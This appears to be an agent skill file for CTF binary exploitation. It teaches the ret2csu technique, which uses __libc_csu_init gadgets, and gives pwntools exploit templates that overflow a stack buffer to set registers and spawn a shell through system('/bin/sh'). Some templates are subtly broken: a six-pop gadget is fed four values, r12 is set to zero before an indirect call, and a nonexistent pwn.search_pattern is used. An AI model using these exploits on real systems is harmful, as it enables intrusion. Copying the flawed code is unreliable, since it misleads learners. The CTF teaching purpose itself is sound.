---
name: ret2csu-exploitation
description: Use this skill whenever you're working on binary exploitation challenges involving ROP chains, especially when you need to set up function call parameters or can't find standard gadgets. Trigger on mentions of ret2csu, __libc_csu_init, ROP chain construction, binary exploitation, CTF challenges with stack overflows, or when you need to control multiple registers for function calls. This skill helps you exploit the __libc_csu_init gadgets to set registers and call functions even when traditional gadgets are unavailable.
---

# Ret2CSU Exploitation

This skill helps you exploit the **ret2csu** technique, which uses gadgets from `__libc_csu_init` to set up function call parameters when traditional ROP gadgets are unavailable.

## When to Use This Skill

Use this skill when:
- You're solving a binary exploitation challenge with a stack overflow
- You need to call a function with specific parameters but can't find gadgets to set registers
- You've identified `__libc_csu_init` in the binary and want to leverage it
- You're working on CTF challenges involving ROP chains
- You need to control multiple registers (rdi, rsi, rdx) for function calls

## Core Concept

The `__libc_csu_init` function contains two powerful gadgets:

### Gadget 1: Register Setup
```asm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```

This lets you set values in rbx, rbp, r12, r13, r14, r15 by popping from the stack.

### Gadget 2: Parameter Setup + Call
```asm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```

This moves values into rdx, rsi, edi (function parameters) and calls a function at `[r12 + rbx*8]`.

## Finding the Gadgets

### Method 1: Using GEF/PEDA
```bash
# In GDB with GEF
gef➤  search-pattern 0x400560  # Search for pointer to known function
gef➤  x/10i __libc_csu_init    # Disassemble to find gadgets
```

### Method 2: Using pwn
```python
from pwn import *
elf = ELF('./binary')

# Common offsets in __libc_csu_init
# These vary by compiler, so verify with your binary
pop_chain = elf.symbols['__libc_csu_init'] + 0x124  # pop r12-r15, ret
reg_call = elf.symbols['__libc_csu_init'] + 0x108   # movs + call
```

### Method 3: Using the Helper Script
```bash
python scripts/find_ret2csu_gadgets.py ./binary
```

## Common Exploitation Patterns

### Pattern 1: Call a Function with Parameters

Use this when you need to call a function like `write(1, buf, len)` or `system("cmd")`.

```python
from pwn import *

elf = ELF('./vuln')
p = process()

# Find gadget addresses (adjust for your binary)
POP_CHAIN = 0x401224  # pop r12, r13, r14, r15, ret
REG_CALL = 0x401208   # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

# Build ROP chain
rop = ROP(elf)
rop.raw('A' * 40)  # Padding to overwrite return address

# First gadget: set up registers
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12 (will be used in [r12 + rbx*8])
rop.raw(0)                      # r13 (becomes edi - 1st param)
rop.raw(0xdeadbeef)             # r14 (becomes rsi - 2nd param)
rop.raw(0xcafebabe)             # r15 (becomes rdx - 3rd param)

# Second gadget: move params and call
rop.raw(REG_CALL)

p.sendlineafter(b'>', rop.chain())
```

### Pattern 2: Bypass the Call and Reach `ret`

Use this when you just need to set registers and return, not call a function.

```python
from pwn import *

elf = ELF('./vuln')
p = process()

csuGadget0 = 0x40089a  # pop rbx, rbp, r12, r13, r14, r15, ret
csuGadget1 = 0x400880  # movs + call + add rbx + cmp + jnz + ret

# Find a pointer to a callable function (like _init)
initPtr = 0x600e38  # Address containing pointer to _init

payload = b'A' * 0x28  # Padding to return address

# First gadget
payload += p64(csuGadget0)
payload += p64(0x0)     # RBX
payload += p64(0x1)     # RBP (must equal RBX+1 to skip jnz)
payload += p64(initPtr) # R12 (pointer to function address)
payload += p64(0xf)     # R13
payload += p64(0xf)     # R14
payload += p64(0xdead)  # R15 (becomes RDX)

# Second gadget - bypass conditions
payload += p64(csuGadget1)
payload += p64(0xf)     # qword for ADD RSP
payload += p64(0x1)     # RBX (must equal RBP to skip jnz)
payload += p64(0x1)     # RBP
payload += p64(0xf)     # R12
payload += p64(0xf)     # R13
payload += p64(0xf)     # R14
payload += p64(0xf)     # R15

# Final return address
payload += p64(elf.sym['win'])

p.sendline(payload)
```

### Pattern 3: Call libc Functions

Use this when you need to call `system()`, `write()`, or other libc functions.

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process()

# Find gadgets
POP_CHAIN = 0x401224
REG_CALL = 0x401208

# Find pointer to system in memory
system_addr = libc.symbols['system']
search_result = pwn.search_pattern(system_addr)  # Use helper script

rop = ROP(elf)
rop.raw('A' * 40)

# Set up for system("/bin/sh")
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13 (edi - 1st param: "/bin/sh")
rop.raw(0)                      # r14 (rsi - 2nd param: NULL)
rop.raw(0)                      # r15 (rdx - 3rd param: NULL)

rop.raw(REG_CALL)

# Chain to actual system call
rop.system('/bin/sh')

p.sendlineafter(b'>', rop.chain())
p.interactive()
```

## Key Conditions to Remember

### For the Call Pattern:
1. `[r12 + rbx*8]` must point to a callable function address
2. If you don't know an address, search for a pointer to `_init` or another known function

### For the Bypass Pattern:
1. `rbp` and `rbx` must have the same value to avoid the `jnz` jump
2. Account for the `add rbx, 0x1` instruction in the second gadget
3. There are omitted pops you need to account for in the stack

## Debugging Tips

### Verify Gadget Addresses
```bash
# In GDB
gef➤  x/20i __libc_csu_init
# Look for the pop sequence and the mov/call sequence
```

### Check Register Values
```bash
# In GDB, set breakpoint before gadget execution
gef➤  break *0x401208
gef➤  info registers
# Verify r12, r13, r14, r15 have expected values
```

### Search for Function Pointers
```bash
# Find where a function address is stored in memory
gef➤  search-pattern 0x400560  # Address of _init or other function
# Use the found address as r12 value
```

## Common Pitfalls

1. **Wrong gadget offsets**: Gadget addresses vary by compiler and binary. Always verify with your specific binary.

2. **Missing padding**: Account for all padding between input and return address.

3. **Register order**: Remember the order: rbx, rbp, r12, r13, r14, r15 (not alphabetical!)

4. **PIE binaries**: If PIE is enabled, you'll need to leak an address first to calculate gadget addresses.

5. **Stack alignment**: Some functions require 16-byte stack alignment. Add padding if needed.

## Helper Scripts

### Find Gadgets
```bash
python scripts/find_ret2csu_gadgets.py ./binary
```

### Build ROP Chain
```bash
python scripts/build_ret2csu_chain.py --binary ./binary --function write --args "1,0x601000,0x20"
```

## Next Steps

1. **Find the gadgets** in your binary using the methods above
2. **Determine your goal**: call a function, set registers, or both?
3. **Choose the pattern** that matches your goal
4. **Build the ROP chain** with correct padding and register values
5. **Test and debug** using GDB
6. **Iterate** if the exploit doesn't work

## References

- [BROP Paper](https://www.scs.stanford.edu/brop/bittau-brop.pdf)
- [GuyInATuxedo ret2csu Tutorial](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html)
- [ir0nstone ret2csu Notes](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation)
